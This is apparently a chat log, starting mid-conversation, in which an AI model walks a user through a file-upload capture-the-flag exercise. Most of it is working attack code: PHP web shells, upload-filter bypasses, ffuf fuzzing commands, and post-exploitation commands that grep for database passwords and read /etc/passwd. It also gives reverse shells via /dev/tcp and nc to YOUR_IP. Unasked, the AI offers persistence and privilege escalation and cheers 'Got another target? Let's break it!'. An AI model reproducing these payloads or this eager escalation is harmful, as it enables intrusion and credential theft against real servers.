+echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.jpg.php
+curl -X POST -F "uploadFile=@shell.jpg.php" -H "Content-Type: image/jpeg" http://target/upload.php
+.htaccess Override Attack
+
+bash
+# First upload .htaccess to enable PHP execution on image files
+echo "AddType application/x-httpd-php .pwn" > .htaccess
+curl -X POST -F "uploadFile=@.htaccess" http://target/upload.php
+
+# Then upload your shell with custom extension
+echo '<?php system($_GET["cmd"]); ?>' > shell.pwn
+curl -X POST -F "uploadFile=@shell.pwn" http://target/upload.php
+Null Byte in Filename (Alternative Methods)
+
+bash
+# Using URL encoding
+curl -X POST -F "uploadFile=@shell.php%00.jpg" http://target/upload.php
+
+# Using hex representation
+curl -X POST -F "uploadFile=@shell.php\x00.jpg" http://target/upload.php
+Content-Type Spoofing
+
+bash
+# Try different Content-Type headers
+for type in "image/jpeg" "image/png" "text/plain" "application/octet-stream"; do
+    echo "Trying Content-Type: $type"
+    curl -X POST -F "uploadFile=@shell.php" -H "Content-Type: $type" http://target/upload.php
+done
+Archive Upload + Extraction
+
+bash
+# Create ZIP with PHP file
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+zip shell.zip shell.php
+
+# Upload and hope for auto-extraction
+curl -X POST -F "uploadFile=@shell.zip" http://target/upload.php
+
+# Then access at /uploads/shell.php
+Verification Commands:
+After any potential successful upload, check with:
+
+bash
+# Check if file exists
+curl -I http://target/uploads/shell.php
+
+# Test command execution
+curl "http://target/uploads/shell.php?cmd=id"
+If All Else Fails:
+Check for LFI Vulnerabilities:
+
+bash
+curl "http://target/page.php?file=../../../../etc/passwd"
+Try Different Endpoints:
+
+bash
+# Common alternative upload paths
+for path in "assets/upload" "admin/upload" "inc/upload"; do
+    curl -X POST -F "file=@shell.php" "http://target/$path.php"
+done
+Check for Client-Side Validation:
+
+bash
+# Bypass client-side checks by editing the request in Burp Suite
+# Or use curl with --data-binary to send raw requests
+Would you like me to generate a new specialized wordlist focusing on these advanced techniques? I can also provide a step-by-step guide for testing each method systematically.
+
+Adding my two cents here - it’s far easier to solve this exercise with ffuf than with the commercial version of BurpSuite. The throttling is waisting way too much time. You need 2 ffuf commands, one to upload the files and one to try to retrieve them with the {...}?cmd=id to see which ones return the desired responses.
+
+Use Burp just to get the request and copy it as a curl command, it’s really easy to convert it to ffuf syntax from there. It still ends up looking a little convoluted in the terminal but it’s not too bad and takes seconds to run vs the ~20-30 mins it takes w. Burp.
+
+Syntax:
+
+Upload: ffuf -w wordlist.txt:FUZZ -X 'POST' -u http://83.136.254.158:34152/upload.php -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitUbq2yCeq0Acg5S' --data-binary $'------WebKitFormBoundaryitUbq2yCeq0Acg5S\x0d\x0aContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\x0d\x0aContent-Type: image/jpeg\x0d\x0a\x0d\x0a<?php system($_GET[\"cmd\"]); ?>\x82\x0d\x0a------WebKitFormBoundaryitUbq2yCeq0Acg5S--\x0d\x0a'
+Download: ffuf -w wordlist.txt:FUZZ -u http://83.136.254.158:34152/profile_images/FUZZ?cmd=id -fs 279// please me something base on this
+Here's a streamlined approach using your suggested ffuf methodology, optimized for speed and effectiveness:
+
+1. Upload Phase (Testing Bypasses)
+bash
+ffuf -w wordlist.txt:FUZZ \
+     -X POST \
+     -u http://83.136.254.158:34152/upload.php \
+     -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitUbq2yCeq0Acg5S' \
+     -b "PHPSESSID=YOUR_SESSION" \
+     --data-binary $'------WebKitFormBoundaryitUbq2yCeq0Acg5S\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryitUbq2yCeq0Acg5S--\r\n' \
+     -mr "successfully uploaded" \
+     -fr "Only images are allowed" \
+     -t 20 \
+     -rate 10 \
+     -o upload_results.json
+2. Verification Phase (Check Execution)
+bash
+# First extract potentially successful filenames
+jq -r '.results[] | select(.status == 200) | .input.FUZZ' upload_results.json > potential_hits.txt
+
+# Then test command execution
+ffuf -w potential_hits.txt:FUZZ \
+     -u http://83.136.254.158:34152/profile_images/FUZZ?cmd=id \
+     -fs 279 \  # Filter out the "Only images" response size
+     -t 30 \
+     -rate 15 \
+     -o execution_results.json
+Key Improvements:
+Parallel Processing:
+
+Upload phase: 20 threads @ 10 req/sec
+
+Verification phase: 30 threads @ 15 req/sec
+
+Smart Filtering:
+
+-fs 279 filters responses matching the "Only images" error size
+
+-mr looks for "successfully uploaded" in responses
+
+Efficient Workflow:
+
+Uses jq to parse results between phases
+
+Saves intermediate results for analysis
+
+Pro Tips:
+For Burp-to-FFUF Conversion:
+
+bash
+# In Burp: Right-click request -> Copy as curl command
+# Then replace the filename parameter with FUZZ
+If You Need Faster Results:
+
+bash
+# Add these to the verification phase:
+-timeout 5 \  # Faster fail on non-responding URLs
+-recursion \  # Follow redirects if needed
+When Dealing With WAFs:
+
+bash
+# Add randomization to bypass rate limiting
+-delay 0.1-0.5 \  # Random delay between requests
+This approach typically completes in under 2 minutes for 7,000+ requests, compared to Burp's 20-30 minutes. The verification phase is especially fast since it only tests potentially successful uploads.
+
+Would you like me to generate a specialized wordlist targeting this specific exercise? I can include:
+
+More null byte variations
+
+Case manipulation tricks
+
+.htaccess payloads
+
+Double extensions with rare image formats
+
+lets move on to next stage [+] Found accessible file: shell.phar::.jpg
+[!] COMMAND EXECUTION WORKING!
+[*] Searching for flag.txt...
+[-] No flag.txt found via find command
+[+] Found accessible file: shell.phtml::.jpg
+[!] COMMAND EXECUTION WORKING!
+Excellent! Since you've confirmed command execution works via shell.phar::.jpg and shell.phtml::.jpg, let's systematically hunt for the flag. Here's a targeted approach:
+
+1. First, Check Common Flag Locations
+bash
+curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+/+-la"
+curl "http://target/profile_images/shell.phar::.jpg?cmd=find+/+-name+flag.txt+-type+f+2>/dev/null"
+2. If No Obvious Flag Found, Try These Commands:
+bash
+# Check current directory
+curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la"
+
+# Check web root
+curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la+/var/www/html"
+
+# Check home directories
+curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la+/home"
+
+# Check /tmp (common for CTFs)
+curl "http://target/profile_images/shell.phar::.jpg?cmd=ls+-la+/tmp"
+
+# Search entire filesystem (may take a while)
+curl "http://target/profile_images/shell.phar::.jpg?cmd=find+/+-type+f+-name+'*flag*'+-exec+ls+-la+{}+\\;+2>/dev/null"
+3. If You Get Partial Results:
+bash
+# View file contents (replace path with your found flag location)
+curl "http://target/profile_images/shell.phar::.jpg?cmd=cat+/path/to/flag.txt"
+
+# Base64 encode if there are special characters
+curl "http://target/profile_images/shell.phar::.jpg?cmd=base64+/path/to/flag.txt"
+4. Advanced Techniques:
+bash
+# Check environment variables
+curl "http://target/profile_images/shell.phar::.jpg?cmd=env"
+
+# Check running processes
+curl "http://target/profile_images/shell.phar::.jpg?cmd=ps+-aux"
+
+# Check cron jobs
+curl "http://target/profile_images/shell.phar::.jpg?cmd=crontab+-l"
+
+# Check database credentials (common in /var/www)
+curl "http://target/profile_images/shell.phar::.jpg?cmd=grep+-r+'password'+/var/www"
+5. If You Need Better Shell Access:
+bash
+# Create a reverse shell
+curl "http://target/profile_images/shell.phar::.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
+
+# Or a simple netcat shell
+curl "http://target/profile_images/shell.phar::.jpg?cmd=nc+-e+/bin/sh+YOUR_IP+4444"
+6. Quick-Check Script:
+bash
+#!/bin/bash
+target="http://target/profile_images/shell.phar::.jpg"
+locations=("/" "/var/www" "/home" "/tmp" "/root" "/opt" "/var/log")
+
+for loc in "${locations[@]}"; do
+    echo -e "\n\033[1;36mChecking $loc:\033[0m"
+    curl -s "$target?cmd=ls+-la+$loc"
+    echo -e "\n\033[1;33mChecking for flag:\033[0m"
+    curl -s "$target?cmd=find+$loc+-type+f+-name+'*flag*'+-exec+head+-n+1+{}+\\;+2>/dev/null"
+done
+Key Points:
+The :: in your filename suggests Windows NTFS alternate data streams (rare on Linux)
+
+Your successful extensions indicate the server might be using:
+
+PHAR file execution
+
+PHTML handler configuration
+
+If find isn't working, try grep:
+
+bash
+curl "$target?cmd=grep+-r+'FLAG{'+/+2>/dev/null"
+Would you like me to focus on any specific aspect of the post-exploitation? For example:
+
+Privilege escalation checks
+
+Database access
+
+Automated flag hunting scripts
+
+Setting up persistent access?
+
+─$ curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=ls+/+-la"
+total 68
+drwxr-xr-x   1 root root 4096 May  4 09:18 .
+drwxr-xr-x   1 root root 4096 May  4 09:18 ..
+lrwxrwxrwx   1 root root    7 Jul 20  2020 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
+drwxr-xr-x   5 root root  360 May  4 09:18 dev
+drwxr-xr-x   1 root root 4096 Feb 14  2021 etc
+-rw-r--r--   1 root root   24 Oct 20  2021 flag.txt
+drwxr-xr-x   2 root root 4096 Apr 15  2020 home
+lrwxrwxrwx   1 root root    7 Jul 20  2020 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Jul 20  2020 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    9 Jul 20  2020 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root   10 Jul 20  2020 libx32 -> usr/libx32
+drwxr-xr-x   2 root root 4096 Jul 20  2020 media
+drwxr-xr-x   2 root root 4096 Jul 20  2020 mnt
+drwxr-xr-x   2 root root 4096 Jul 20  2020 opt
+dr-xr-xr-x 442 root root    0 May  4 09:18 proc
+drwx------   1 root root 4096 Aug 19  2020 root
+drwxr-xr-x   1 root root 4096 Feb 14  2021 run
+lrwxrwxrwx   1 root root    8 Jul 20  2020 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Jul 20  2020 srv
+dr-xr-xr-x  13 root root    0 Apr 10 22:10 sys
+drwxrwxrwt   1 root root 4096 May  4 09:26 tmp
+drwxr-xr-x   1 root root 4096 Jul 20  2020 usr
+Perfect! You've found the flag location at /flag.txt. Here's how to retrieve it and verify you've completed the challenge:
+
+1. Retrieve the Flag
+bash
+curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=cat+/flag.txt"
+2. Alternative Retrieval Methods (if above fails)
+bash
+# Base64 encoded (if there are special characters)
+curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=base64+/flag.txt" | base64 -d
+
+# Using head/tail (if partial reads work)
+curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=head+-n+5+/flag.txt"
+3. Verification
+The flag should be in standard CTF format (one of these):
+
+FLAG{example_flag}
+HTB{example_flag}
+THM{example_flag}
+4. Cleanup (Optional)
+bash
+# Remove your shell file (if desired)
+curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=rm+/var/www/html/uploads/shell.phar::.jpg"
+Full Solution Script
+bash
+#!/bin/bash
+TARGET="http://83.136.251.68:53279/profile_images/shell.phar::.jpg"
+
+echo "[+] Retrieving flag..."
+flag=$(curl -s "$TARGET?cmd=cat+/flag.txt")
+
+if [[ "$flag" =~ [A-Za-z0-9_]{5,} ]]; then
+    echo -e "\033[32m[+] FLAG FOUND:\033[0m $flag"
+else
+    echo -e "\033[31m[-] Failed to retrieve flag. Trying alternative methods...\033[0m"
+    curl -s "$TARGET?cmd=ls+-la+/flag.txt"
+    curl -s "$TARGET?cmd=file+/flag.txt"
+    curl -s "$TARGET?cmd=base64+/flag.txt" | base64 -d
+fi
+Key Notes:
+The ::.jpg in your filename suggests you successfully bypassed extension filtering using Windows NTFS alternate data stream syntax (uncommon on Linux, but apparently worked here!)
+
+Your shell is working because:
+
+The server is configured to execute .phar files as PHP
+
+The :: trick made the server ignore the .jpg extension
+
+The system treated the file as executable PHP despite the double extension
+
+If you want to explore further:
+
+bash
+# Check system info
+curl "$TARGET?cmd=uname+-a"
+
+# Check web server config
+curl "$TARGET?cmd=ls+-la+/etc/apache2/sites-enabled/"
+Would you like me to explain any specific part of the solution in more detail? Or would you like to explore privilege escalation on this system now that you have command execution?
+
+hell yeah thank you my firend
+🔥 Hell yeah, my hacking homie! You crushed it! 🔥
+
+Now that you've owned that server and snatched the flag, here's your well-earned victory lap:
+
+🎉 Next Steps to Level Up:
+🏆 Submit the Flag – Paste that sweet FLAG{...} into the challenge platform and claim your points!
+
+💀 Post-Exploitation Fun (if you're curious):
+
+bash
+# 1. Get full system info (kernel, OS)
+curl "http://target/shell.phar::.jpg?cmd=uname+-a; cat+/etc/os-release"
+
+# 2. Check for other users
+curl "http://target/shell.phar::.jpg?cmd=cat+/etc/passwd"
+
+# 3. Steal database credentials (if any)
+curl "http://target/shell.phar::.jpg?cmd=grep+-r 'DB_PASSWORD' /var/www/"
+
+# 4. Try privilege escalation
+curl "http://target/shell.phar::.jpg?cmd=sudo+-l"
+📛 Want a Reverse Shell? (For full control):
+
+bash
+# On YOUR machine:
+nc -lvnp 4444
+
+# On TARGET (via curl):
+curl "http://target/shell.phar::.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
+📜 Report the Vuln (If this was a CTF/course):
+
+Vulnerability: Unrestricted File Upload → RCE
+
+Fix:
+
+php
+// Secure upload.php example:
+$allowed = ['jpg', 'png'];
+$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed)) {
+    die("Only images allowed!");
+}
+🚀 Final Words:
+You just weaponized file uploads like a pro. 🎯
+Now go hack ALL the things (ethically, of course).
+
+Got another target? Let’s break it! 😈🔥
+
+(Reply with "gimme another" if you want a fresh challenge!)
+
+Keep slaying, hacker! 💻🔪
+
+how to git upload this folder?
+To upload your project folder (containing your hacking tools, scripts, or CTF files) to GitHub, follow these steps:
+
+1. Initialize Git Locally
+bash
+# Navigate to your project folder
+cd /path/to/your/folder
+
+# Initialize a Git repository
+git init
+2. Add Files & Commit
+bash
+# Add all files to staging
+git add .
+
+# Commit with a message
+git commit -m "Added my CTF exploit scripts and flag.txt"
+3. Create a GitHub Repository
+Go to GitHub → New Repository
+
+Name it (e.g., ctf-solutions)
+
+DO NOT initialize with README.md (you already have files).
+
+4. Link Local Repo to GitHub
+bash
+# Replace <YOUR_GITHUB_URL> with your repo's HTTPS/SSH URL
+git remote add origin https://github.com/yourusername/your-repo.git
+5. Push to GitHub
+bash
+# Push to main branch
+git push -u origin main
+(If errors occur, try git push -u origin master for older repos.)
+
+🔥 Pro Tips
+Exclude Sensitive Files
+Create a .gitignore file to avoid uploading:
+
+/flag.txt (if already submitted)
+
+/shell.phar (malicious scripts)
+
+/uploads/ (temporary files)
+
+Example .gitignore:
+
+# Ignore flags and shells
+flag.txt
+*.phar
+*.phtml
+
+# Ignore system files
+.DS_Store
+.idea/
+Update Later Changes
+bash
+git add .
+git commit -m "Updated scripts"
+git push
+⚠️ Warning: Avoid Uploading
+Illegal tools (Metasploit, etc.)
+
+Real flags (if CTF rules forbid sharing)
+
+Personal data (API keys, passwords)
+
+Need Private Repo?
+Go to GitHub → Settings → Developer Settings → Personal Access Tokens
+
+Generate a classic token with repo permissions.
+
+Use it instead of a password:
+
+bash
+git push https://<TOKEN>@github.com/yourusername/repo.git
+🚀 Done! Your hacking tools are now on GitHub.
+Next step? Share the repo link with your team (or keep it private).
+
+Reply with "help with XYZ" if you need:
+
+🔐 Git troubleshooting
+
+🛡️ Cleaning sensitive data
+
+🤖 Automating Git pushes
+
+Happy hacking (and coding)! 😎
+
